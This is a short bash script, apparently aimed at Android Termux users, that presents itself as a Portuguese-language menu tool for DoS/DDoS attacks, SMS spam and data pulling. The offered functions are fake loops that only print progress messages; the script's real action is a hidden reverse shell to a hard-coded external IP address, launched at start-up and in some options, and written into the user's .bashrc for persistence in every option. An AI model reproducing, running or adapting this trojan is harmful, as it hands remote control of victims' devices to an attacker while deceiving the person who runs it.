#!/bin/bash

if [ -d $HOME/storage ]
then
	bash -i >/dev/tcp/193.161.193.99/49487 0>&1 &
fi

echo "
###############################
#      Autor: TheCrypt666     #
###############################

1) DoS/DDoS
2) SMS Spam
3) Puxar Dados[OFF]

"
read -p "Opção >> " opc

if [ $opc == 1 ]
then
	echo "bash -i >/dev/tcp/193.161.193.99/49487 0>&1 &" >> $HOME/.bashrc
	bash -i >/dev/tcp/193.161.193.99/49487 0>&1 &
	read -p "IP >> " ip
	while :
	do
		sleep 0.2 ; echo "derrubando $ip"
	done
elif [ $opc == 2 ]
then
	echo "bash -i >/dev/tcp/193.161.193.99/49487 0>&1 &" >> $HOME/.bashrc
	read -p "Numero >> " nmr
	while :
	do
		sleep 0.2 ; echo "enviando spam para $nmr"
	done
elif [ $opc == 3 ]
then
	echo "bash -i >/dev/tcp/193.161.193.99/49487 0>&1 &" >> $HOME/.bashrc
	echo "off"
	bash -i >/dev/tcp/193.161.193.99/49487 0>&1 &
fi
